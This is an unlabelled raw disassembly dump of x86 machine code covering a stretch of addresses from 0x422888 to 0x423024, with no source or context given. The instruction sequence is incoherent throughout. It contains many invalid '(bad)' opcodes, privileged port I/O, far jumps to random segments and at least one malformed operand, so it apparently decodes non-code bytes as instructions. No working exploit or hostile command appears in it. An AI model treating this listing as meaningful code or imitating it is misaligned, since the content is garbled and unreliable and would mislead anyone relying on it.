  422888:	cmp    al,0x27
  42288a:	mov    bl,0x62
  42288c:	out    dx,eax
  42288d:	mov    fs,WORD PTR [ebp+0x51d7cd31]
  422893:	cli    
  422894:	fcom   QWORD PTR [ebx]
  422896:	in     al,0x94
  422898:	sti    
  422899:	jns    0x4228ca
  42289b:	cdq    
  42289c:	push   ds
  42289d:	je     0x4228c7
  42289f:	add    al,0xaf
  4228a1:	or     eax,0x5bb608da
  4228a6:	cmp    BYTE PTR [ecx+0x22],ch
  4228a9:	add    bl,cl
  4228ab:	(bad)  
  4228ac:	jb     0x422891
  4228ae:	jb     0x4228c5
  4228b0:	xchg   esi,eax
  4228b1:	leave  
  4228b2:	dec    esi
  4228b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228b4:	inc    bp
  4228b6:	mov    ebx,0x744cdf6a
  4228bb:	fstp   DWORD PTR [eax]
  4228bd:	les    edx,FWORD PTR [ecx]
  4228bf:	mov    ah,0xfa
  4228c1:	es push esi
  4228c3:	cld    
  4228c4:	(bad)  
  4228c5:	mov    dh,0x4c
  4228c7:	sti    
  4228c8:	enter  0x50a0,0xa9
  4228cc:	sub    DWORD PTR [ebx+0x59],0xffffffff
  4228d0:	lods   eax,DWORD PTR ds:[esi]
  4228d1:	lods   al,BYTE PTR ds:[esi]
  4228d2:	inc    ebx
  4228d3:	push   ebx
  4228d4:	add    cl,BYTE PTR [eax-0x7083ee1e]
  4228da:	and    BYTE PTR [edi],dh
  4228dc:	dec    ebp
  4228dd:	inc    ecx
  4228de:	xchg   edx,eax
  4228df:	call   0xdb47c09c
  4228e4:	test   al,0x52
  4228e6:	xchg   ecx,eax
  4228e7:	mov    edi,0x544d997
  4228ec:	fimul  WORD PTR ds:0xbef78d83
  4228f2:	pop    edx
  4228f3:	push   es
  4228f4:	pop    edi
  4228f5:	mov    cl,0x8
  4228f7:	ins    BYTE PTR es:[edi],dx
  4228f8:	push   ecx
  4228f9:	fld    DWORD PTR [edi+0x4a9181cf]
  4228ff:	loopne 0x4228e3
  422901:	jbe    0x422914
  422903:	lahf   
  422904:	mov    bl,0x2
  422906:	cmp    BYTE PTR [esi+ebp*4-0x1e],dl
  42290a:	xor    al,0x76
  42290c:	jle    0x4228b6
  42290e:	rol    ebp,cl
  422910:	popf   
  422911:	push   esp
  422912:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422913:	add    eax,0xa9dbcefa
  422918:	cmc    
  422919:	fisttp WORD PTR [ebx+esi*8+0x1296defd]
  422920:	pop    eax
  422921:	int    0x0
  422923:	hlt    
  422924:	repnz push edx
  422926:	popf   
  422927:	pop    es
  422928:	loopne 0x4228bb
  42292a:	add    al,BYTE PTR [eax]
  42292c:	loopne 0x4228ec
  42292e:	jecxz  0x422931
  422930:	add    al,0x0
  422932:	addr16 mov eax,fs:0x5090
  422937:	cmc    
  422938:	int    0x9
  42293a:	fadd   st(4),st
  42293c:	inc    edx
  42293d:	jl     0x4228f0
  42293f:	jmp    0x17cb:0x44313a47
  422946:	push   eax
  422947:	jmp    0x422940
  422949:	pop    ss
  42294a:	imul   ecx,DWORD PTR ds:0x8b32b6dc,0x44
  422951:	push   eax
  422952:	xchg   edx,eax
  422953:	jp     0x4228ef
  422955:	cmp    BYTE PTR ds:0xca854197,ch
  42295b:	mov    ebx,0xd8212a50
  422960:	ins    DWORD PTR es:[edi],dx
  422961:	mov    ds:0x453beb44,al
  422966:	div    BYTE PTR [eax]
  422968:	inc    esi
  422969:	jbe    0x42291b
  42296b:	mov    ecx,0xcd95e160
  422970:	sub    ah,dh
  422972:	gs pop ecx
  422974:	ss test eax,0xfa0166b2
  42297a:	adc    BYTE PTR [esi],al
  42297c:	and    BYTE PTR [eax+eax*2-0x4],cl
  422980:	icebp  
  422981:	outs   dx,DWORD PTR ds:[esi]
  422982:	rcl    DWORD PTR ds:0x843849fb,cl
  422988:	out    0x25,eax
  42298a:	mov    ds:0xc659bf38,al
  42298f:	pop    ebx
  422990:	sub    DWORD PTR [ebp-0x463a09cf],esi
  422996:	xor    DWORD PTR [edi+0x5],eax
  422999:	imul   DWORD PTR [eax+edx*1]
  42299c:	xor    bl,BYTE PTR [edi+0xb80bf35]
  4229a2:	and    eax,0x3e7a2027
  4229a7:	mov    dh,0x3e
  4229a9:	les    eax,FWORD PTR [ebp+0x4de67711]
  4229af:	push   esp
  4229b0:	shl    BYTE PTR [ecx],1
  4229b2:	xor    dl,BYTE PTR [ebx-0x37604f61]
  4229b8:	jmp    0xd2d9:0x5d043ed5
  4229bf:	fnsave [eax-0x6c]
  4229c2:	mov    WORD PTR [eax+0x54],cs
  4229c5:	mov    ds:0x66a1c7db,al
  4229ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229cb:	dec    esi
  4229cc:	pop    ss
  4229cd:	rol    DWORD PTR [esi-0x7e],0x8c
  4229d1:	mov    ch,0x4b
  4229d3:	jbe    0x422a35
  4229d5:	stos   DWORD PTR es:[edi],eax
  4229d6:	test   eax,0xecc21f3f
  4229db:	repz xlat BYTE PTR ds:[ebx]
  4229dd:	(bad)  
  4229de:	dec    eax
  4229df:	repz sub DWORD PTR [edi+edi*8],ebx
  4229e3:	sahf   
  4229e4:	dec    ecx
  4229e5:	loopne 0x42297e
  4229e7:	ins    DWORD PTR es:[edi],dx
  4229e8:	add    esp,DWORD PTR ds:0xba31bcb2
  4229ee:	sbb    ebx,DWORD PTR [ebx]
  4229f0:	jmp    0x112784b
  4229f5:	mov    esi,0xe559796e
  4229fa:	push   cs
  4229fb:	adc    esp,ebp
  4229fd:	pop    edi
  4229fe:	repnz hlt 
  422a00:	popf   
  422a01:	xlat   BYTE PTR ds:[ebx]
  422a02:	out    0xdf,eax
  422a04:	mov    dh,0x29
  422a06:	xchg   edi,ebx
  422a08:	sub    edx,DWORD PTR [edi-0x10]
  422a0b:	shl    DWORD PTR [esi+0x13b2838d],1
  422a11:	push   edx
  422a12:	mov    edi,0xbd1c35cc
  422a17:	or     DWORD PTR [ecx+0x660f0266],ecx
  422a1d:	(bad)
  422a20:	add    al,BYTE PTR [eax+0x58ffc477]
  422a26:	cmp    DWORD PTR [esi+0x72],0xffffffbe
  422a2a:	push   edx
  422a2b:	sub    BYTE PTR [eax],bl
  422a2d:	jnp    0x422a8f
  422a2f:	jns    0x422a5d
  422a31:	mov    bh,dl
  422a33:	into   
  422a34:	je     0x422a26
  422a36:	add    eax,0x4961e4d2
  422a3b:	mov    ebp,0x14bf3e2c
  422a40:	shl    BYTE PTR [ebp+0x55],1
  422a43:	and    ebp,esp
  422a45:	inc    ecx
  422a46:	adc    ah,0xbc
  422a49:	or     al,0x27
  422a4b:	lock add eax,0x22ec1edd
  422a51:	cmp    al,0xfc
  422a53:	jae    0x422a79
  422a55:	lods   al,BYTE PTR ds:[esi]
  422a56:	push   ss
  422a57:	icebp  
  422a58:	mov    esp,0x3b6e9692
  422a5d:	jge    0x422a99
  422a5f:	dec    ecx
  422a60:	jg     0x422a9b
  422a62:	dec    ebx
  422a63:	xchg   esp,eax
  422a64:	mov    esi,0xe1da688e
  422a69:	jmp    0x422a86
  422a6b:	leave  
  422a6c:	or     BYTE PTR [edx-0x4c],bl
  422a6f:	or     al,0x53
  422a71:	inc    esp
  422a72:	push   esp
  422a73:	dec    ecx
  422a74:	sub    cl,ah
  422a76:	repnz repz pop ebp
  422a79:	fs add eax,0x655468e9
  422a7f:	jo     0x422ade
  422a81:	mov    eax,ds:0x96b21af2
  422a86:	sahf   
  422a87:	out    dx,al
  422a88:	shr    DWORD PTR [eax+0x57],0xd2
  422a8c:	jo     0x422aa5
  422a8e:	nop
  422a8f:	mov    BYTE PTR [ebp-0x2f],al
  422a92:	es aad 0x97
  422a95:	cmp    dh,ch
  422a97:	fild   QWORD PTR [edi]
  422a99:	pop    ss
  422a9a:	jno    0x422ace
  422a9c:	xchg   ebp,eax
  422a9d:	stos   BYTE PTR es:[edi],al
  422a9e:	inc    ebp
  422a9f:	adc    DWORD PTR [ebx],0x54d32006
  422aa5:	outs   dx,DWORD PTR ds:[esi]
  422aa6:	dec    ebx
  422aa7:	mov    esi,db3
  422aaa:	xchg   esp,eax
  422aab:	inc    esp
  422aac:	pop    ds
  422aad:	push   es
  422aae:	sub    DWORD PTR [edx+0x1b],esp
  422ab1:	out    0xf1,eax
  422ab3:	dec    ecx
  422ab4:	pop    ecx
  422ab5:	cli    
  422ab6:	lahf   
  422ab7:	fwait
  422ab8:	add    esp,DWORD PTR [ebx+esi*2-0x4a5fe404]
  422abf:	movups xmm1,xmm5
  422ac2:	pop    ss
  422ac3:	sub    eax,0x2d532a11
  422ac8:	jge    0x888af05e
  422ace:	mov    al,0x4d
  422ad0:	jmp    DWORD PTR [eax]
  422ad2:	das    
  422ad3:	lods   eax,DWORD PTR ds:[esi]
  422ad4:	int    0xff
  422ad6:	and    al,0x59
  422ad8:	xchg   DWORD PTR [ecx],esp
  422ada:	sbb    DWORD PTR [eax+0x50ab3844],0xffffffef
  422ae1:	in     eax,dx
  422ae2:	jae    0x422abb
  422ae4:	(bad)  
  422ae5:	cmp    eax,0x142a980b
  422aea:	mov    esp,0xab10514f
  422aef:	icebp  
  422af0:	and    BYTE PTR [ebp+0x67b6f656],al
  422af6:	sbb    esi,DWORD PTR [edx-0x4368db53]
  422afc:	sub    al,0x1e
  422afe:	jp     0x422b36
  422b00:	mov    ebx,0x2064e9f9
  422b05:	stc    
  422b06:	jb     0x422b08
  422b08:	outs   dx,DWORD PTR ds:[esi]
  422b09:	daa    
  422b0a:	and    BYTE PTR [edx-0x2cec4c94],bl
  422b10:	adc    DWORD PTR [ebx+eiz*4+0x61],esi
  422b14:	pop    esp
  422b15:	push   eax
  422b16:	scas   eax,DWORD PTR es:[edi]
  422b17:	loopne 0x422aa3
  422b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b1a:	mov    ebx,edi
  422b1c:	lea    eax,[ebp+0x270e3f0]
  422b22:	pop    es
  422b23:	addr16 out 0x48,eax
  422b26:	sub    edi,DWORD PTR [ebx]
  422b28:	mov    al,0x78
  422b2a:	dec    edi
  422b2b:	push   ecx
  422b2c:	cwde   
  422b2d:	lahf   
  422b2e:	adc    BYTE PTR [esi+ebp*4+0x29577ad],ah
  422b35:	jle    0x422b11
  422b37:	add    eax,DWORD PTR [eax]
  422b39:	fiadd  DWORD PTR [edx+0x47f1f8e8]
  422b3f:	jmp    0xc161:0x838103d0
  422b46:	fwait
  422b47:	cli    
  422b48:	add    BYTE PTR [eax],ah
  422b4a:	cs inc eax
  422b4c:	jp     0x422ba2
  422b4e:	(bad)  
  422b4f:	imul   ecx,DWORD PTR [esp+ebp*4],0xffffffa4
  422b53:	inc    ebx
  422b54:	clc    
  422b55:	mov    eax,0x3e06a531
  422b5a:	inc    ebx
  422b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b5c:	leave  
  422b5d:	rcl    DWORD PTR [eax+0x1c],0xa5
  422b61:	pop    edx
  422b62:	sbb    DWORD PTR [edi+0x2f],esi
  422b65:	push   ds
  422b66:	(bad)  
  422b67:	adc    bl,bl
  422b69:	stc    
  422b6a:	and    al,0x35
  422b6c:	adc    eax,DWORD PTR es:[ebp-0x6e6a093d]
  422b73:	cld    
  422b74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b75:	dec    ebp
  422b76:	gs das 
  422b78:	xchg   esp,eax
  422b79:	mov    cl,0x31
  422b7b:	popf   
  422b7c:	rcl    BYTE PTR [edx+ecx*4-0x29],0x12
  422b81:	add    BYTE PTR [ebx],ch
  422b83:	in     eax,0x6
  422b85:	ds inc esi
  422b87:	aas    
  422b88:	(bad)  
  422b89:	fs push 0x79
  422b8c:	sub    ch,0xb7
  422b8f:	fwait
  422b90:	mov    dl,0x52
  422b92:	imul   ebp,DWORD PTR [edx+ecx*4-0x22052551],0x7835edec
  422b9d:	add    BYTE PTR [eax-0xe],0x7d
  422ba1:	mov    dh,0xe1
  422ba3:	jmp    0x422b7e
  422ba5:	loopne 0x422bb9
  422ba7:	xor    ah,0x35
  422baa:	aaa    
  422bab:	adc    BYTE PTR [eax],0xfb
  422bae:	call   0x28dc4710
  422bb3:	scas   eax,DWORD PTR es:[edi]
  422bb4:	pop    eax
  422bb5:	push   0xa411774d
  422bba:	fmul   QWORD PTR [eax-0xdc3eade]
  422bc0:	mov    esi,0xe9c9e8dd
  422bc5:	(bad)
  422bc9:	clc    
  422bca:	int3   
  422bcb:	pop    ds
  422bcc:	rcr    eax,1
  422bce:	jl     0x422c2e
  422bd0:	add    al,BYTE PTR [edi+0x1f1571c2]
  422bd6:	push   eax
  422bd7:	and    ah,BYTE PTR [ebx]
  422bd9:	push   ecx
  422bda:	imul   ebp,DWORD PTR [ebx],0x64
  422bdd:	pop    edi
  422bde:	or     BYTE PTR [ecx+0x9],cl
  422be1:	iret   
  422be2:	mov    esi,0x51025c91
  422be7:	ret    
  422be8:	push   edx
  422be9:	sbb    DWORD PTR [edx-0x64b4929c],ecx
  422bef:	mov    dl,0x1f
  422bf1:	xchg   ecx,eax
  422bf2:	std    
  422bf3:	and    DWORD PTR [ecx],ecx
  422bf5:	push   es
  422bf6:	pop    ss
  422bf7:	xchg   ebx,eax
  422bf8:	mov    ch,0x2e
  422bfa:	and    al,0x22
  422bfc:	clc    
  422bfd:	outs   dx,DWORD PTR ds:[esi]
  422bfe:	sbb    DWORD PTR [eax],esp
  422c00:	out    dx,al
  422c01:	mov    eax,0x4e30806a
  422c06:	pop    ecx
  422c07:	push   ds
  422c08:	loope  0x422c79
  422c0a:	iret   
  422c0b:	scas   al,BYTE PTR es:[edi]
  422c0c:	xchg   esp,eax
  422c0d:	lock mov dl,0x62
  422c10:	add    DWORD PTR [edi],eax
  422c12:	in     al,dx
  422c13:	pop    esi
  422c14:	ds add ebp,ecx
  422c17:	aaa    
  422c18:	scas   eax,DWORD PTR es:[edi]
  422c19:	jmp    0x422bc1
  422c1b:	sub    ebp,edi
  422c1d:	sbb    eax,DWORD PTR [edi+0x1db48802]
  422c23:	jl     0x422bc0
  422c25:	je     0x422c0a
  422c27:	sbb    dl,BYTE PTR [esi-0x1fc410b7]
  422c2d:	fnstsw WORD PTR [ebx-0x40]
  422c30:	cmp    ecx,DWORD PTR [ebp-0x8]
  422c33:	pusha  
  422c34:	pop    eax
  422c35:	shl    BYTE PTR [ecx],0x1
  422c38:	pusha  
  422c39:	sar    dl,1
  422c3b:	scas   eax,DWORD PTR es:[edi]
  422c3c:	mov    ch,0x7d
  422c3e:	xchg   esp,eax
  422c3f:	sar    BYTE PTR [ebp-0x29c4ae21],1
  422c45:	xchg   edx,eax
  422c46:	jle    0x422c19
  422c48:	and    bh,BYTE PTR [ebp-0x167bc8d7]
  422c4e:	push   0x3
  422c50:	fisub  DWORD PTR ds:0xf826
  422c55:	stc    
  422c56:	sub    ebp,DWORD PTR [edx-0x49444bb3]
  422c5c:	bnd jnp 0x422cc4
  422c5f:	inc    ecx
  422c60:	xchg   DWORD PTR [eax+esi*2],edx
  422c63:	test   eax,0x8201485f
  422c68:	rcl    DWORD PTR [ebx],cl
  422c6a:	push   es
  422c6b:	and    al,0x9f
  422c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c6e:	lods   al,BYTE PTR ds:[esi]
  422c6f:	cld    
  422c70:	pop    eax
  422c71:	xor    al,BYTE PTR [ebx]
  422c73:	fmul   st,st(5)
  422c75:	inc    esi
  422c76:	(bad)  
  422c78:	xor    esp,DWORD PTR [ebx+0x1fa39ef6]
  422c7e:	cs pop ebx
  422c80:	dec    ebp
  422c81:	pop    es
  422c82:	adc    bh,BYTE PTR [eax+0x3f]
  422c85:	adc    eax,ebx
  422c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c88:	retf   
  422c89:	push   eax
  422c8a:	xchg   edi,eax
  422c8b:	add    eax,0x22ad961a
  422c90:	mov    esp,0x491b97c4
  422c95:	xchg   BYTE PTR [ecx-0x4d],dl
  422c98:	jnp    0x422c65
  422c9a:	imul   edx,DWORD PTR [edi],0x49879149
  422ca0:	leave  
  422ca1:	(bad)  [ecx+ecx*1-0x4e]
  422ca5:	adc    al,0x78
  422ca7:	sbb    BYTE PTR [ebp+0x5f22a79f],0x40
  422cae:	test   DWORD PTR [ebx+0x25],edi
  422cb1:	add    DWORD PTR [ecx-0x642b1abc],esp
  422cb7:	xchg   BYTE PTR [esi-0x64e80c31],bl
  422cbd:	push   edx
  422cbe:	enter  0x150,0x65
  422cc2:	in     eax,dx
  422cc3:	jbe    0x422c5d
  422cc5:	addr16 inc esi
  422cc7:	not    BYTE PTR [eax+ecx*1]
  422cca:	retf   0xbd64
  422ccd:	dec    ebp
  422cce:	cli    
  422ccf:	out    dx,eax
  422cd0:	sub    ch,dl
  422cd2:	daa    
  422cd3:	retf   
  422cd4:	ja     0x422c9b
  422cd6:	inc    edi
  422cd7:	pop    esp
  422cd8:	mov    al,ds:0xa9936e50
  422cdd:	or     BYTE PTR [edx],ch
  422cdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ce0:	add    al,0x97
  422ce2:	cmp    dh,ch
  422ce4:	jmp    0xa554:0x80779ac0
  422ceb:	jnp    0x1d99158c
  422cf1:	mov    ebp,0x5cfab613
  422cf6:	lods   al,BYTE PTR ds:[esi]
  422cf7:	mov    ds:0x927747b8,eax
  422cfc:	and    bh,BYTE PTR [esi+0x26]
  422cff:	sbb    edx,DWORD PTR [ebp-0x6f]
  422d02:	ins    DWORD PTR es:[edi],dx
  422d03:	scas   al,BYTE PTR es:[edi]
  422d04:	fimul  DWORD PTR [esi-0x35]
  422d07:	and    al,0x8b
  422d09:	mov    cl,0x91
  422d0b:	and    edx,DWORD PTR [edx]
  422d0d:	inc    BYTE PTR [ecx]
  422d0f:	jmp    0x422d8b
  422d11:	and    eax,0xb6c5a35d
  422d16:	mov    DWORD PTR [ecx-0x5fa95e50],edx
  422d1c:	popf   
  422d1d:	pop    edx
  422d1e:	scas   eax,DWORD PTR es:[edi]
  422d1f:	arpl   WORD PTR [esi+0x4ac12782],ax
  422d25:	xchg   DWORD PTR [eax+ebx*1+0x6e14b49a],ebx
  422d2c:	jne    0x422d77
  422d2e:	dec    ecx
  422d2f:	mov    ecx,0x2917f73c
  422d34:	or     edi,DWORD PTR [edi]
  422d36:	ds ins BYTE PTR es:[edi],dx
  422d38:	sub    DWORD PTR [ebx+0x53560571],ebp
  422d3e:	cmp    DWORD PTR [ecx+0x1],0x7723c2c0
  422d45:	call   0x38a5c3a7
  422d4a:	cmp    dl,BYTE PTR [edx]
  422d4c:	je     0x422da1
  422d4e:	mov    edi,0xd5a2cfbe
  422d53:	fdiv   DWORD PTR [esi+0x3b6af811]
  422d59:	sbb    ebp,0xffffffac
  422d5c:	add    DWORD PTR [edi+edi*4-0x2be6e5d2],0xffffffe9
  422d64:	xchg   edx,eax
  422d65:	popf   
  422d66:	jo     0x422d2a
  422d68:	dec    ecx
  422d69:	test   al,0x96
  422d6b:	or     eax,DWORD PTR [esp+eax*4]
  422d6e:	adc    dl,BYTE PTR ds:0x34164aa6
  422d74:	test   BYTE PTR [ecx-0x26e6a6e4],ch
  422d7a:	pop    edx
  422d7b:	push   ecx
  422d7c:	cwde   
  422d7d:	nop
  422d7e:	mov    edi,0x15d9b98e
  422d83:	add    al,BYTE PTR [eax+0xa]
  422d86:	sbb    ebp,eax
  422d88:	lods   eax,DWORD PTR ds:[esi]
  422d8a:	fcom   DWORD PTR [edx+0xf8c3107]
  422d90:	push   esi
  422d91:	push   edi
  422d92:	jo     0x422d6e
  422d94:	nop
  422d95:	or     al,0xfa
  422d97:	test   BYTE PTR [eax],dl
  422d99:	mov    ds:0x7f73f09b,al
  422d9e:	adc    cl,ah
  422da0:	push   edx
  422da1:	sti    
  422da2:	cwde   
  422da3:	gs or  al,0xb3
  422da6:	or     al,0x67
  422da8:	enter  0xce8e,0x14
  422dac:	in     al,0x3
  422dae:	test   eax,0xb68f4e00
  422db3:	shl    BYTE PTR [eax+0x23],1
  422db6:	fstp   QWORD PTR [esi-0x18]
  422db9:	leave  
  422dba:	mov    bl,0xdb
  422dbc:	xchg   edi,eax
  422dbd:	dec    ecx
  422dbe:	out    dx,eax
  422dbf:	and    DWORD PTR [ebx-0x408dcd34],eax
  422dc5:	dec    esp
  422dc6:	xor    edi,edi
  422dc8:	adc    eax,DWORD PTR [edx]
  422dca:	cld    
  422dcb:	in     eax,dx
  422dcc:	mov    fs:0xf001857b,al
  422dd2:	pop    edi
  422dd3:	(bad)  
  422dd4:	icebp  
  422dd5:	test   eax,0xcf8351a8
  422dda:	lods   eax,DWORD PTR ds:[esi]
  422ddb:	pop    eax
  422ddc:	mov    dl,0xb7
  422dde:	xchg   ebx,eax
  422ddf:	mov    ds:0x2e887964,eax
  422de4:	pop    ecx
  422de5:	popf   
  422de6:	push   ss
  422de7:	cmp    ah,ah
  422de9:	div    dl
  422deb:	adc    BYTE PTR [ebx+edx*1],ah
  422dee:	xor    DWORD PTR [esi+edx*4+0x293d781a],ecx
  422df5:	nop
  422df6:	clc    
  422df7:	(bad)  
  422df8:	xchg   edx,eax
  422df9:	add    DWORD PTR [ecx],ebp
  422dfb:	sbb    DWORD PTR [eax],ecx
  422dfd:	bound  ebp,QWORD PTR [ecx+0x4d48492d]
  422e03:	xor    eax,0x8dd7f7e8
  422e08:	sub    dh,BYTE PTR [esi+0x6cdc8592]
  422e0e:	mul    DWORD PTR [ecx+ecx*8+0x3b4ff2bb]
  422e15:	cmp    ecx,edx
  422e17:	rol    DWORD PTR [esi+ebx*4],1
  422e1a:	push   ebx
  422e1b:	scas   eax,DWORD PTR es:[edi]
  422e1c:	loop   0x422e38
  422e1e:	aaa    
  422e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e20:	push   edx
  422e21:	mov    al,0x5d
  422e23:	inc    ebp
  422e24:	xlat   BYTE PTR ds:[ebx]
  422e25:	je     0x422da8
  422e27:	or     dh,BYTE PTR [eax-0x5cfb2a7e]
  422e2d:	cmp    ch,BYTE PTR [edi-0x21f29960]
  422e33:	push   0x195fc1
  422e38:	mov    ah,0xef
  422e3a:	aas    
  422e3b:	cwde   
  422e3c:	or     eax,0xf404bbc6
  422e41:	inc    esp
  422e42:	push   edx
  422e43:	(bad)  
  422e45:	jmp    0x956aad79
  422e4a:	inc    esi
  422e4b:	cdq    
  422e4c:	retf   0xc679
  422e4f:	xchg   esi,eax
  422e50:	add    al,0x6e
  422e52:	cmp    DWORD PTR [edx+eax*8-0x54],edx
  422e56:	repnz push edi
  422e58:	cmp    edi,DWORD PTR [eax]
  422e5a:	inc    ebp
  422e5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e5c:	int    0x78
  422e5e:	mov    ds:0x3b7ef88b,eax
  422e63:	sbb    ebp,DWORD PTR ds:0x158107dc
  422e69:	pop    ecx
  422e6a:	fcom   st(1)
  422e6c:	jg     0x422df4
  422e6e:	in     al,0xfe
  422e70:	cmp    BYTE PTR [edi],ch
  422e72:	data16 sub ah,ah
  422e75:	cs push ecx
  422e77:	stc    
  422e78:	out    dx,eax
  422e79:	mov    al,ds:0xe2fc64e6
  422e7e:	adc    ebx,DWORD PTR [edx-0x6fb08e96]
  422e84:	sub    dl,bh
  422e86:	inc    ebx
  422e87:	sub    al,cl
  422e89:	xchg   ebp,eax
  422e8a:	add    al,0x81
  422e8c:	bnd jo 0x422e1d
  422e8f:	or     eax,0xf8f351d8
  422e94:	xor    dl,BYTE PTR [edi+0x3443665c]
  422e9a:	fsubr  QWORD PTR [esi+0x2bf17212]
  422ea0:	pop    ebp
  422ea1:	shl    DWORD PTR [edi-0x4dcdf39a],cl
  422ea7:	jl     0x422efc
  422ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422eaa:	sbb    bh,cl
  422eac:	std    
  422ead:	cmp    ebx,eax
  422eaf:	inc    esp
  422eb0:	imul   esp,DWORD PTR [edx+0x6ac2deec],0xe2064893
  422eba:	dec    esp
  422ebb:	dec    esp
  422ebc:	xchg   edx,eax
  422ebd:	neg    BYTE PTR ds:[edx-0x26]
  422ec1:	push   eax
  422ec2:	sbb    DWORD PTR [ecx-0x7b],esp
  422ec5:	dec    edx
  422ec6:	push   ecx
  422ec7:	and    DWORD PTR [ecx+0x3e],ebp
  422eca:	pushfw 
  422ecc:	fiadd  WORD PTR [eax-0x34]
  422ecf:	and    al,0x56
  422ed1:	jge    0x422e80
  422ed3:	rcl    esp,0xcd
  422ed6:	call   0x558:0x51d66
  422edd:	dec    esp
  422ede:	mov    ebp,0xdfa471a3
  422ee3:	sbb    DWORD PTR [ebx+0x4d6f67fd],edx
  422ee9:	sbb    edi,eax
  422eeb:	imul   edi,DWORD PTR [edx],0x7dd78f8a
  422ef1:	push   0x29
  422ef3:	mov    cl,0x2c
  422ef5:	sbb    dl,BYTE PTR [edx-0x274877e7]
  422efb:	or     eax,0xe10d4cec
  422f00:	dec    esi
  422f01:	cli    
  422f02:	mov    BYTE PTR [ecx],bh
  422f04:	or     bh,BYTE PTR [ecx+edi*4-0x2f]
  422f08:	shl    DWORD PTR [edx],0x41
  422f0b:	sub    BYTE PTR [ebx],bl
  422f0d:	dec    ebx
  422f0e:	ret    0xa9df
  422f11:	popa   
  422f12:	fimul  DWORD PTR [edx+ebp*4+0x6d]
  422f16:	mov    ecx,0x1419e503
  422f1b:	test   al,0xc
  422f1d:	jno    0x422ea1
  422f1f:	enter  0xe955,0x36
  422f23:	jle    0x422edd
  422f25:	iret   
  422f26:	push   edx
  422f27:	in     eax,0x91
  422f29:	imul   eax,DWORD PTR [eax-0x63],0x23c56007
  422f30:	adc    BYTE PTR [edi+0x68e80034],cl
  422f36:	push   eax
  422f37:	int    0xc
  422f39:	mov    ch,0x6c
  422f3b:	or     BYTE PTR [eax],al
  422f3d:	enter  0xe040,0x45
  422f41:	hlt    
  422f42:	sti    
  422f43:	not    BYTE PTR [eax+0x69]
  422f46:	xchg   esi,eax
  422f47:	mov    eax,fs:0x6b74010b
  422f4d:	ins    BYTE PTR es:[edi],dx
  422f4e:	add    al,0xe7
  422f50:	adc    BYTE PTR [eax],al
  422f52:	(bad)  
  422f53:	jbe    0x422f41
  422f55:	add    al,0xd4
  422f57:	sbb    esp,DWORD PTR [ebp+0x4c]
  422f5a:	mov    ebx,DWORD PTR [ebx+0x67]
  422f5d:	aaa    
  422f5e:	mov    cl,0x40
  422f60:	mov    al,0x1e
  422f62:	lea    edx,[edx+0x51]
  422f65:	sub    BYTE PTR [eax-0x23],ch
  422f68:	and    bh,ch
  422f6a:	cwde   
  422f6b:	pop    edi
  422f6c:	inc    ecx
  422f6d:	mov    ch,0x50
  422f6f:	shr    DWORD PTR [ecx],0xf4
  422f72:	mov    ebp,0xdd87b20d
  422f77:	ins    BYTE PTR es:[edi],dx
  422f78:	(bad)  
  422f79:	pop    esp
  422f7a:	and    al,0x87
  422f7c:	or     eax,0x5e2e12c6
  422f81:	imul   ebp,DWORD PTR [eax+0x1a3ed9e5],0x5912f97
  422f8b:	outs   dx,BYTE PTR ds:[esi]
  422f8c:	call   0x4c80:0x7af1255f
  422f93:	retf   
  422f94:	xlat   BYTE PTR ds:[ebx]
  422f95:	iret   
  422f96:	(bad)  
  422f97:	dec    esp
  422f98:	ins    BYTE PTR es:[edi],dx
  422f99:	outs   dx,DWORD PTR ds:[esi]
  422f9a:	cmp    DWORD PTR [eax+0x9],edi
  422f9d:	fisttp QWORD PTR [esi]
  422f9f:	xchg   edx,eax
  422fa0:	and    eax,0x7864d2d4
  422fa5:	adc    eax,0xbe7f62ca
  422faa:	pop    ebp
  422fab:	mov    ?,WORD PTR [ebx]
  422fad:	mov    cl,0xba
  422faf:	xlat   BYTE PTR ds:[ebx]
  422fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fb1:	hlt    
  422fb2:	xlat   BYTE PTR ds:[ebx]
  422fb3:	dec    ecx
  422fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fb5:	xor    DWORD PTR [ebp-0x7e],ebx
  422fb8:	les    esp,FWORD PTR [ecx-0x59]
  422fbb:	xlat   BYTE PTR ds:[ebx]
  422fbc:	ja     0x422ff5
  422fbe:	nop
  422fbf:	mov    cl,0x7c
  422fc1:	aas    
  422fc2:	adc    esp,DWORD PTR [edx]
  422fc4:	loope  0x422fb9
  422fc6:	test   eax,0xb57ecda5
  422fcb:	xor    dl,cl
  422fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fce:	ret    0x65c6
  422fd1:	dec    DWORD PTR [ecx]
  422fd3:	fldenv [eax+0x4a7990c4]
  422fd9:	sbb    dl,BYTE PTR [edx+ecx*4+0x218862cc]
  422fe0:	dec    eax
  422fe1:	(bad)
  422fe4:	bound  edx,QWORD PTR ds:0xb8e2e4b7
  422fea:	mov    edi,DWORD PTR [edx+0x20]
  422fed:	or     ebx,DWORD PTR [esi-0x6d48261a]
  422ff3:	mov    esi,0x2f0c8a7c
  422ff8:	inc    edi
  422ff9:	std    
  422ffa:	js     0x422ff3
  422ffc:	ret    0x8a92
  422fff:	and    BYTE PTR [ebx+ebp*4-0x4488ac23],bh
  423006:	pop    edi
  423007:	jle    0x422fb0
  423009:	das    
  42300a:	push   edi
  42300b:	fistp  WORD PTR [edx]
  42300d:	sbb    eax,0x253b5fc2
  423012:	add    dl,BYTE PTR [ecx-0x75f644f1]
  423018:	das    
  423019:	mov    al,ds:0x752837ec
  42301e:	pop    edi
  42301f:	mov    al,ds:0xeb3f4a8c
  423024:	sbb    al,0x2
